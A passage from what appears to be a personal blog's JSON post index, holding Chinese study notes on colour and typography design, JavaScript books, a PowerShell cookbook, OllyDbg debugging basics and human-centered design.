无彩色 &lt; 有彩色      低纯度 &lt; 高纯度      蓝绿色系 &lt; 红黄色系        前进色（暖色系）和后退色（冷色系）  膨胀色（浅色）和收缩色（深色）配色的实践  主色、亮色比较靠近，其间加入基础色  基础色用单色，明度与主色拉开差距4.文字排版字体  宋体——有衬线字体  黑体——无衬线字体  粗体、斜体  等幅字体（每个字占据大小一样）和比例字体（不一样）文字排版  行间距：文字大小的150%～180%  一行15～40字  行宽和行间距成比例变宽或变窄  大标题和正文要强弱对比5.设计的思维模式以人为本的设计  UI（User Interface）  UX（User eXperience）      问询表    设计课题  商品名称、服务名称  促销要点  竞争对手的商品  目标人群  问题点  预想的成果物  日程  素材、资料    引导行为：人们优先选择负担小的或可期待的结果"
  },
  
  {
    "title": "JavaScript Learning",
    "url": "/posts/JavaScript_Learning/",
    "categories": "",
    "tags": "Website",
    "date": "2017-04-18 00:00:00 -0700",
    





    
    "snippet": "学习目录：  Javascript DOM 编程艺术  Mastering Javascript  Design Patterns: Elements of Reusable Object-Oriented Software  锋利的jQuery  Javascript高级程序设计Javascript DOM 编程艺术1. JavaScript简史1.1 JavaScript是一种脚本语言，...",
    "content": "学习目录：  Javascript DOM 编程艺术  Mastering Javascript  Design Patterns: Elements of Reusable Object-Oriented Software  锋利的jQuery  Javascript高级程序设计Javascript DOM 编程艺术1. JavaScript简史1.1 JavaScript是一种脚本语言，通常只能通过Web浏览器去完成一些操作而不能像普通意义上的程序那样独立运行1.2 DOM是一套对文档的内容进行抽象和概念化的方法。W3C对DOM的定义：一个与系统平台和变成语言无关的接口，程序和脚本可以通过这个接口动态的访问和修改文档的内容、结构和样式。2.JavaScript语法2.1结构方法1:放在&lt;head&gt;标签中&lt;script&gt;\tJavaScript goes here...&lt;/script&gt;   方法2:放在&lt;body&gt;标签中&lt;script src=\"file.js\"&gt;&lt;/script&gt;2.2变量//JS是弱类型var mood = 33;alert(mood);//关联数组var lennon = Array();lennon[\"name\"] = \"John\";//对象var lennon = Object();lennon.name = \"John\";2.3操作符条件语句：if,else比较操作符：&lt;&gt;=,==,===逻辑操作符：&amp;&amp;,!,||循环语句：while,for3.DOM3.1 定义D:document(文档)O:Object(对象)M:Model(模型)3.2 获取元素:通过元素ID、标签名字、类名字getElementById()getElementsByTagName()getElementsByClassName()3.3获取设置属性.getAttribute().setAttribute()4.JavaScript图片库5.最佳实践5.1平稳退化：当浏览器不支持JavaScript时也能正常浏览。（搜索机器人）7.动态创建标记7.1传统方法document.write(\"&lt;p&gt;This is inserted.&lt;/p&gt;\");innerHTML    //全部内容被替换createElement()    //创建元素appendChild()    //附上子节点createTextNode()    //创建文本insertBefore(newElement,targetElement)    //在已有元素前插入新元素insertAfter()7.2Ajax:对页面的请求以异步方式发送给服务器，依赖服务器端处理（Hijax）XMLHttpRequest    8.充实文档的内容//缩略语：   &lt;abbr title=\"Application Programming Interface\"&gt;API&lt;/abbr&gt;Mastering Javascript [Finished][Indian] Ved Antani本书在我不是很理解的章节一直提及《设计模型》这本书，决定之后尝试研究一下。1. JS入门1.0 JavaScript支持的标准类型7种：Number, String, Boolean, Symbol, Object, Null, Undefined1.1 Number类型的数字，如果大于Number.MAX_VALUE则被赋值为Number.POSITIVE_INFINITY；反之，若小于Number.MIN_VALUE则被赋值为Number.NEGATIVE_INFINITY.1.2 高级数学计算使用Math，如Math.E/Math.SQRT2/Math.abs(-900)/Math.pow(2,3)1.3 parseInt()/parseFloat()将字符串表达式转换成整数或浮点数1.4 JSHint 检查js可疑语法的工具。 很多配置文件结尾使用rc（bashrc/vimrc）：run com，来源于Unix祖先CTSS使用名为runcom文件表示命令行脚本特征，沿用至今缩写为rc。2. 函数、闭包与模块2.1 函数，作为参数传递给另一个函数；作为数据赋值给变量。2.2 IIFE(Immediately Invoked Function Expression) 立即调用的函数表达式 (function() {})();和(function(){}())。缺点：很难调试、无法递归、过多IIFE代码难以阅读。2.3 javascript没有块作用域，只有函数作用域。ES6引入let生成块作用域，let的声明在编译时不会提前到块作用域最顶部。2.4 函数和变量的声明在编译阶段会被移到作用域的顶端（函数表达式不会被提升），函数在先变量在后，而赋值或其他可执行的逻辑依然保留在原位。不要通过条件判断给使用函数声明给函数赋予不同逻辑，因为函数声明不能出现在块结构中，因为所有js实现在这个方面各不相同。块只能包含语句，不能包含函数声明。应该使用函数表达式替代函数声明。2.5 arguments转化成数组：var args = Array.prototype.slice.call(arguments);。2.6 this对象，也称作函数上下文。  作为函数调用的函数，this被绑定在全局对象上。  作为方法调用的函数，this被绑定在方法被调用时所在的对象上。  作为构造函数调用的函数，需在调用前加上关键字new，this被绑定在新创建的对象上。  apply()接受一个参数数组，call()接受参数列表。2.7 闭包是在函数声明时所创建的作用域，使得函数能够访问并处理函数的外部变量。闭包常用来将信息封装成私有变量的形式。2.8 setTimeout()的回调函数在时间到达时才执行，改成立即调用函数表达式解决这个问题。2.9 模块：一个外围函数（IIFE或者具名函数）至少执行一次；外围函数至少返回一个内部函数。3. 数据结构及相关操作3.1 正则表达式3.1.1 正则表达式：字面量var pattern = /test/;和构造RegExp对象的实例var pattern = new RegExp(\"test\");使用pattern.test(\"xxxtest\")实现匹配，返回true/false。使用exec()参数为单个字符串，返回包含了所有匹配的数组。3.1.2 正则表达式中\\b表示单词边界。^/$表示正则表达式的首尾。向后引用可以匹配同一字符串已经匹配好的内容，使用\\1,\\2等数字定义。3.1.3 正常情况下是贪婪模式，会尽可能多的匹配，使用.。在正则表达式后面加上？设置为懒惰模式，会尽可能少的匹配。3.2 数组  xxx.forEach(function() {}); 迭代数组  xxx.concat(xxx); 合并数组  join() \t数组合并成字符串  ES6引入map和setunderscore.js库，提供函数式变成辅助程序4. 面向对象的JS艰深，不太理解4.1 使用普通函数var crazyBob = Player();，不会实例化crazyBob，使用构造函数var swingJay = new Player();会得到一个实例化对象swingJay。4.2 对象的原型，默认属性：prototype。实例属性的优先级高于原型属性。4.3 this的值由函数调用上下文以及调用位置所决定。同2.6  全局上下文中，this在浏览器中一般指代window。  对象方法中，this被赋值或绑定到包含对象上。  不存在上下文，this被绑定到全局上下文。  this用于构造函数，this指向被构造的对象。4.4 将对象实例继承的方法：Child.prototype = new Person();。4.5 JS没有类的概念，只能通过函数作用域实现类似于private/public这种访问修饰器的作用。  特权方法使用this.method = function() {}来声明。可以从外部调用，也可以由成员访问。  公共方法使用Class.prototype.method = function() {}声明。任何人可以读取或写入。  公共属性使用this.prototype来声明。4.6 Object.create()可以在不用调用对象的构造函数的情况下，在父子之间创建使用new操作符一样的原型链。例如：Manager.prototype = Object.create(Employee.prototype);4.7 接收器和设置器 getter/setterUnderscore.js中包含keys()/allKeys()/values()等功能函数5. JavaScript模式5.1 标准化方法创建模块：CommonJS适用于服务器端JS环境(Node.js)。异步模块定义，浏览器优先，支持异步行为。5.2 工厂模式 创建相似对象抽出重复出现的操作；允许工厂的用户在无需了解对象创建内部细节的情况下创建对象。5.3 mixin模式和继承的区别：如需多个对象层次之间共享的功能，使用mixin；如果是单层次，使用继承，且继承的情况下修改原型会影响从原型继承的一切内容。5.4 装饰器模式 xxx.decorate('xxxx');对空白对象进行修饰以满足不同需求。7. ES6语法上的变化7.1 引入四个新的数据结构：Map, WeakMap, Set, WeakSet。对象的缺点是不能使用非字符串值作为键。WeakMap的键必须是对象，值的类型没有限制，不能迭代，无法清除。引入数据类型Symbol，是唯一且不可变的值，通常用作对象属性的标识符，可看做ID。7.2 ...将数组元素分散或集合到函数的各个参数中，如print(a,b)函数，print(...[1,2]);，类似于spread/rest，将参数分散成多个参数/将多个参数集中成一个参数。7.3 for…in遍历索引，for…of遍历数组的值。箭头函数 var f1 = (x,y) =&gt; x*y;，另外箭头函数解决了箭头函数范围内直接使用上一个块this值而不需要单独赋值。8. DOM操作与事件8.1 DOM是HTML的编程接口，允许使用JS等脚本语言对其进行结构化操作。8.2 使用CDN（content delivery network）导入jQuery库。$(document).ready();函数会在DOM文档准备好之后执行。  $( '#username' ).addClass( 'hidden' );添加一个类  $( '#username' ).removeClass( 'hidden' );删除一个雷、类  $( '#username' ).toggleClass( 'hidden' );切换元素的类8.3 增加时间监听器button.addEventListener(\"click\", function(){});。类似的使用$('button').on()可以一次绑定多个事件。9. 服务器端JavaScript9.1 Node采用异步处理的方式，作为一个单线程运行，其本身内部是多线程的。每一个I/O操作都有回调函数。9.2 如下实现一个简单的Node.js服务器（使用request的Node.js模块）。\tvar http = require('http');\tvar server = http.createServer();\tserver.on('request', function (req, res) {\t\tres.writeHead(200, {'Content-Type': 'text/plain'});\t\tres.end('Hello Node\\n');\t});\tserver.listen(3000);9.3 可以通过curl知名查看内部信息。curl -v http://localhost:30009.4 Node包管理器npm(Node Package Manager)。  创建package.json文件：npm init。  将模块的依赖关系自动添加到package.json中：npm install package --save。  全局安装npm install package -g/--global；本地安装npm install package /--save-devDesign Patterns: Elements of Reusable Object-Oriented Software设计模型：可复用面向对象软件的基础Erich Gamma, Richard Helm, Ralph Johnson, John Vlissides本书介绍了什么是设计模式以及如何设计面向对象的软件系统。模型分为3类：创建型、结构型、行为型。本书把面向对象软件的设计经验作为设计模式记录下来，命名、解释、评价这些设计模式，方便人们有效地利用。目前没有需要开发大型软件的需求，暂时不做深入研究，但是这本书还是很有意义的。锋利的jQuery单东林 张晓菲 魏然1. 认识jQuery1.1 JavaScript库：Prototype, Dojo, YUI, Ext JS, MooTools, jQuery。1.2 $(document).ready()表示等待网页中所有DOM结构绘制完毕执行。1.3 jQuery对象是通过jQuery包装DOM对象后产生的对象//jQuery对象转成DOM对象var $cr = $(\"#cr\");\t\t//jQuery对象var cr = $cr[0];\t\t\t//DOM对象var cr = $cr.get(0);\t//DOM对象//DOM对象转成jQuery对象var cr = document.getElementById(\"cr\");\t//DOM对象var $cr = $(cr);\t\t\t\t\t\t//jQuery对象1.4 若jQuery库在其他库之前导入，可以直接使用；jQuery在其他库之后导入，使用var $j = jQuery.noConflict()定义快捷方式来使用。【红宝书】Javascript高级程序设计[America] Nicholas C.Zakas1. 基础1.1 Javascript组成部分：核心(ECMAScript)、文档对象模型(DOM)、浏览器对象模型(BOM)。  ECMAScript由ECMA-262定义，其宿主环境包括：Web浏览器、Node、Adobe Flash等。提供核心语言功能。  文档对象模型(DOM, Document Object Model)：针对XML但经过扩展用于HTML的应用程序编程接口。提供访问和操作网页内容的方法和接口。  浏览器对象模型(BOM, Browser Object Model)：控制浏览器显示的页面以外的地方。提供与浏览器交互的方法与接口。1.2 &lt;script&gt;元素6个属性  async：立即下载脚本且不妨碍页面其他操作，只对外部脚本有效。  charset：通过src属性指定代码的字符集。  defer：脚本延迟到文档完全被解析和显示后再执行，只对外部脚本有效。  language：废弃  src：包含要执行的代码的外部文件。  type：language的替代属性，表示编写代码使用的脚本语言内容类型。一般使用text/javascript在使用&lt;script&gt;嵌入JS代码时，内部不能出现&lt;/script&gt;字符，否则浏览器会以为是结束标签。使用外部文件时，带有src属性的&lt;script&gt;元素内不能有额外的JS代码。外部文件位置一般放在body开头，放在head里会使得外部文件在页面渲染前运行，在放在body中则是页面渲染之后再运行外部文件。当然，可以通过增加defer属性实现脚本运行延迟。若使用async属性，则多个外部脚本的运行顺序不能确定。在XHTML中，可以使用CDATA[]片段来包裹js代码，实现可以使用特殊符号，如&lt;等。1.3 文档模式：混杂模式、标准模式"
  },
  
  {
    "title": "powershell cookbook",
    "url": "/posts/powershell_cookbook/",
    "categories": "",
    "tags": "Security",
    "date": "2017-04-17 00:00:00 -0700",
    





    
    "snippet": "1.使用指南1.1运行脚本（调用操作：命令名中包含空格）&amp; 'C:\\Program Files\\Program.exe' arguments当前目录下：.\\Program.exe arguments1.3配置文件Prompt()函数1.4帮助Get-Command/Get-Help1.7命令转化为Base64编码$commands = '1..10' | % { \"Powershel...",
    "content": "1.使用指南1.1运行脚本（调用操作：命令名中包含空格）&amp; 'C:\\Program Files\\Program.exe' arguments当前目录下：.\\Program.exe arguments1.3配置文件Prompt()函数1.4帮助Get-Command/Get-Help1.7命令转化为Base64编码$commands = '1..10' | % { \"Powershell Rocks\" }'$bytes = [System.Text.Encoding]::Unicode.GetByte($commands)$encodedString = [Convert]::ToBase64String($bytes)2.管道2.2过滤列表项或命令输出项//列出所有正在运行的进程名称包含“Search”的进程Get-Process | Where-Object { $_.Name -like \"*Search*\" }2.4处理列表或命令输出的每一项//输出1～10*2，$_是输入的参数1..10 | Foreach-Object { $_ * 2 }//获得文件内容(txt,csv)Get-Content3.变量和对象3.2访问环境变量//列出env驱动器的所有子节点Get-ChildItem env:3.4使用.NET对象//静态方法[ClassName]::MethodName(parameter list)\t[System.Diagnostics.Process]::GetProcessById(0)//(New-Object Net.WebClient).DownloadString(\"http://live.com\")\t3.8使用COM对象$object = New_Object -ComObject ProgId//了解对象的方法和属性$object | Get-Member (-Static)Get-Member -InputObject $object//MSDN获得详细文档3.12向类添加自定义的方法和属性使用XML4.循环与流程控制4.2比较和逻辑运算符、条件语句运算符：-eq,-ne,-ge,-gt,-like,-notlike,-is,-isnot逻辑符：-and,-or,-xor,-not条件语句：if,elseif,else,switch循环语句：for,foreach,while,do...while4.5添加暂停或延迟暂停直到enter：Read-Host暂停直到按下某一键：$host.UI.RawUI.ReadKey()5.字符串与非结构化文本5.1 创建字符串原生字符串使用单引号支持变量扩展和转移字符的使用双引号PS &gt;\"{0} divided by {1} is {2}\" -f $number2, $number1, ($number2 / $number1)5.7根据文本或模式在字符串中查找字符串与通配符匹配：-like字符串与正则表达式匹配：-match字符串是否包含特定字符串：.Contains(\"\")    字符串在另一个字符串的位置：IndexOf()替换文本：.Replace(\"World\",\"Powershell\")字符串大小写转换：\"\".ToUpper(),\"\".ToLower()去掉字符串的空格：Trim()5.12转换文本流为对象替换文本：Sed搜索文本：Grep6.计算与数学计算6.3度量一个列表的统计属性Measure-Object -Average -Sum -Property Length7.简单文件7.1获取文件内容Get-Content C:\\file.txt${ C:\\file.txt }//-Delimiter 修改换行标识//ReadCount设置读取的行数//一次读取所有文件，处理大文件时需要格外小心[File]::ReadAllText()7.2搜索文件的文本Select-String-Simple 不区分大小写//使用正则表达式递归搜索所有文件名为.txt的文件，将Get-Childitem的结果通过管道输出给Select-StringGet-ChildItem -Filter *.txt -Recurse | Select-String pattern//当前目录下搜索扩展名为DLL的文件是否包含“Debug”Get-ChildItem | Where { $_ | Select-String \"Debug\" -Quiet }7.5创建临时文件$filename = [System.IO.Path]::GetTempFileName()Remove-Item -Force $filename8.结构化文件8.1访问XML文件中的信息$xml = [xml] (Get-Content $filename)8.4导入导出结构化数据Export-CliXmlImport-CliXml9.支持Internet的脚本9.1从Internet下载一个文件$wc = New-Object System.Net.WebClient$wc.DownloadFile($source, $destination)//下载Web页面$content = $wc.DownloadString($source)9.5将命令的输出生成一个Web页面ConvertTo-Html9.7与Internet协议交互10.代码复用10.2编写一个函数param([double] $fahrenheit)\t//脚本的形参$celsius = $fahrenheit -32\t//操作$celsius = $celsius / 1.8\"$fahrenheit degrees Fahrenheit is $celsius degrees Celsius.\" //输出10.3脚本//脚本块 Map-Object//使用库脚本$scriptDirectory = Split-Path $myInvocation.MyCommand.Path.(Join-Path $scriptDirectory LibraryTemperature.ps1)//访问管道数据    $input10.8用命令关键字(Cmdlet Keywords)编写面向管道的脚本//把脚本分为初始化、处理和清除function{begin{}process{}end{}}//使用fearch($element in $input)访问输入管道的元素//面向管道的函数\t\tfilter代替function11.列表、数组和hash表//赋值列表用逗号分隔$Array = 1,2,\"Hello World\"//新建数组$myArray = New-Object string [] 10//创建多维数组$jagged = @(    (1,2,3,4)    (5,6,7,8))//访问数组每个元素Foreach_Object，foreach，forForeach_Object { $sum += $_ }foreach($element in $myArray){$sum += $element }//数组排序Get-ChildItem | Sort-Object -Descending Length | Slelect Name,Length//数组包含某项，匹配：-eq,-like,-match\"Hello\",\"World\" - contains \"Hello\"//合并数组$result = $firstArray + $secondArray//从数组中移出元素:-ne,-notlike,-notmatch$array = $array -ne \"Item1\"//使用ArrayList类完成高级的数组任务$myArray = New-Object System.Collections.ArrayList[void] $myArray.Add(\"Hello\")[void] $myArray.AddRange((\"World\",\"how ara you\"))$myArray.RemoveAt(1)//创建hash表$myHashtable @{}$myHashtable = @{Key1 = \"Value1\";\"Key 2\" = 1,2,3}$myHashtable[\"New Item\"] = 5//获取hash表中各个元素GetEnumerator()12.用户交互//使用Read-Host$directory = Read-Host \"Enter a directory name\"//读取用户输入的按键[Console]::ReadKey()//给用户显示输出和消息Write-Host, Out-Host//为长时间运行的任务提供进度更新Write-Progress//主机的用户界面访问功能 $host.UI.RawUI.WindowTitle = (Get-Location)13.跟踪和错误管理13.1查看由某一命令生成的错误$error, $eooroView//清除错误$error.Clear()$error.Count()13.2处理警告、错误和终止错误//忽略响应警告信息$warningPreference = \"SilentlyContinue\"//忽略非终止信息$errorActionPreference = \"SilentlyContinue\"13.4调试脚本Write-Debug, //逐步、跟踪、环境检查Set-PsDebug -StepSet-PsDebug -Trace$host.EnterNestedPrompt14.掌握环境$myInvocation提供当前脚本、函数或脚本块的大量信息:MyCommand:命令本身的信息ScriptLineNumber:命令行号ScriptName:调用改命令的脚本名称Line:在脚本行中调用该命令的文本InvocationName:调用该命令的名称PipelineLength:命令管道中的命令数PipelinePostion:管道中的命令位置Definition/Path:脚本运行完整路径//确定系统路径和特殊文件夹位置[Environment]::GetFolderPath(\"System\")15.Windows PowerShell的拓展15.1访问WMI数据//检索WMI类的所有实例Get-WmiObject -ComputerName Computer -Class Win32_Bios //检索WMI特定实例Get-WmiObject Win32_Service -Filter \"StartMode = 'Auto'\"//使用WMI的WQL语言检索$query = [WmiSearcher] \"SELECT * FROM Win32_Service WHERE StartMode = 'Auto'\"15.4使用.NET来执行高级的WMI任务//使用所生成的对象PsBase属性//获取与给定的实例相关的WMI实例，调用GetRelated()$instance = [Wmi] 'Win32_service.Name=\"winmgmt\"'$instance.PsBase.GetRelated()15.6使用COM脚本接口自动化程序$shell = New-Object -ComObject \"Shell.Application\"$shell.Windows() | Format-Table LocationName,LocationUrl16.安全和脚本签名16.1通过执行策略启动脚本 Set-ExecutionPolicy RemoteSigned Restricted     受限 Allsigned      签名 Remote Signed  远程签名 Unrestricted   不受限制16.2脚本或格式文件签名$cert = @(Get-ChildItem cert:\\CurrentUser\\My -CodeSigning)[0]Set-AuthenticodeSignature file.ps1 $cert16.4管理企业中的安全性组策略模版部署证书服务来为域账户自动生成证书应用软件限制策略16.5验证脚本的数字签名Get-AuthenticodeSignature16.6安全地处理敏感信息$secureInput = Read-Host -AsSecureString \"Enter your Private key\""
  },
  
  {
    "title": "OllyDbg基础",
    "url": "/posts/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "CTF",
    "date": "2017-03-10 00:00:00 -0800",
    





    
    "snippet": "1.OllyDbg的基础1.1设置“大本营”Goto命令设置断点注释标签 1.2调试方法代码执行法字符串检索法API检索法：调用代码中／API代码中设置断点1.3打补丁：修改字符串直接修改buffer在其他内存区域生成新的字符串并传递给消息函数1.4小端序vs大端序（正常顺序）1.5寄存器1.5.1通用寄存器 \tEAX:累加器\tEBX:基地址寄存器\tECX:计数器\tEDX:数据寄存器\tEBP...",
    "content": "1.OllyDbg的基础1.1设置“大本营”Goto命令设置断点注释标签 1.2调试方法代码执行法字符串检索法API检索法：调用代码中／API代码中设置断点1.3打补丁：修改字符串直接修改buffer在其他内存区域生成新的字符串并传递给消息函数1.4小端序vs大端序（正常顺序）1.5寄存器1.5.1通用寄存器 \tEAX:累加器\tEBX:基地址寄存器\tECX:计数器\tEDX:数据寄存器\tEBP:扩展基址指针寄存器\tESI:源变址寄存器 \tEDI:目的变址寄存器\tESP:栈指针寄存器1.5.2段寄存器\tCS:代码段寄存器\tSS:栈段寄存器\tDS:数据段寄存器\tES:附加段寄存器\tFS:数据段寄存器\tGS:数据段寄存器1.5.3程序状态与控制寄存器1.5.4指令指针寄存器1.6栈"
  },
  
  {
    "title": "Human-Centered Design Class 2—Inspiration Phase",
    "url": "/posts/Class2_Inspiration_Phase/",
    "categories": "",
    "tags": "Design",
    "date": "2017-02-18 00:00:00 -0800",
    





    
    "snippet": "1.Choose a Design Challenge-Collect Thoughts-Review What You Already Know-Define What You Don't Know-Review Constraints or Barriers2.Plan Your Research MethodsA.Learn from people-Define Your Audien...",
    "content": "1.Choose a Design Challenge-Collect Thoughts-Review What You Already Know-Define What You Don't Know-Review Constraints or Barriers2.Plan Your Research MethodsA.Learn from people-Define Your Audience-Care about the extremes people not only the mainstreams-Where/How much time/How/What activity will be done during the interview-Trusted Atmosphere-Interviewee's environment,important quotes and taking photosB.Learn from experts-Experts' suggestions-Make the plan flexible-Secondary ResearchC.Immerse yourself in context-Plan your observations-Got what you see-Write it downD.Analogous inspiration-Brainstorm analogous experiences-Don't worry about wasting time3.Build Your Interview Guide-Identify objectives:Why/How/Who-Tell useful and inspiring feedback-Organize your questions:open and deep-Share early ideas and concepts before conversation-Comfirm your plan-Different roles have different assignments4.Additional Research Methods-Participants' diaries-Photo-Journey or map-Card Sorts5.Capture Your Learnings-Share your impressions-Illustrate new ideas####Case Study:VroomChildren’s readiness for kindergarten (and life beyond) hinges on positive engagement with their parents and caregivers during the  rst  ve years of their lives."
  }
  
]

